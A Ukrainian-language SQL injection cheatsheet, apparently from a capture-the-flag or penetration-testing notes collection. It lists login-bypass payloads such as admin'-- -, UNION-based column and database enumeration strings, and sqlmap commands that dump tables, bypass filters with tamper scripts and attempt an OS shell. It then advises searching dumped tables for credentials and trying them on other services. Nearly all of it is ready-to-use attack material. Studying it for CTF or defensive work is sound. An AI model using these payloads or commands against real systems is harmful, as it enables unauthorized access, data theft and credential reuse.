# Cheatsheet: SQL Injection / sqlmap

Обхід логіну та дамп даних (креди/прапорці в таблицях). ← [web-enum](../02-workflows/web-enum.md) · [web-vulns](../04-techniques/web-vulns-overview.md)

## Швидка ручна перевірка
```
'           →  помилка SQL? → вразливо
' OR '1'='1
' OR 1=1-- -
admin'-- -
" OR 1=1-- -
```
У login-формі: `username: admin'-- -` + будь-який пароль → часто вхід.

## Виявити тип (ручне)
```
?id=1'            → помилка?
?id=1 AND 1=1     → норма
?id=1 AND 1=2     → інша сторінка → boolean-based
?id=1' ORDER BY 5-- -   → кількість колонок
?id=-1' UNION SELECT 1,2,3-- -   → які колонки видимі
?id=-1' UNION SELECT 1,version(),database()-- -
```

## sqlmap (авто)
```bash
# GET-параметр
sqlmap -u "http://$TARGET/page?id=1" --batch --dbs
# POST
sqlmap -u "http://$TARGET/login" --data='user=a&pass=b' --batch
# з кукою/сесією
sqlmap -u "http://$TARGET/x?id=1" --cookie='PHPSESSID=...' --batch
# з запиту, збереженого з Burp
sqlmap -r req.txt --batch

# прохід углиб:
sqlmap -u "...?id=1" --batch -D <db> --tables
sqlmap -u "...?id=1" --batch -D <db> -T users --dump
```

## Корисні опції
| Опція | Значення |
|---|---|
| `--batch` | без питань (дефолти) |
| `--dbs / --tables / --columns` | перелік |
| `-D -T -C` | вибір бази/таблиці/колонок |
| `--dump` | вивантажити дані |
| `--level 3 --risk 2` | глибше (якщо не бачить) |
| `--technique=BEUST` | типи інʼєкцій |
| `--os-shell` | спробувати RCE (якщо дозволяє БД) |
| `--tamper=space2comment` | обхід фільтрів |
| `-p id` | тестувати конкретний параметр |

## Де шукати прапорці/креди після дампу
Таблиці `users`, `admin`, `accounts`, `config`, `flags`, `notes`. Хеші → інколи plaintext поруч.

## Пастки
- `--batch` корисний, але без агресії на платформу (правила: без флуду).
- Знайдені креди → перевірка на [інших сервісах](../02-workflows/credential-hunting.md).
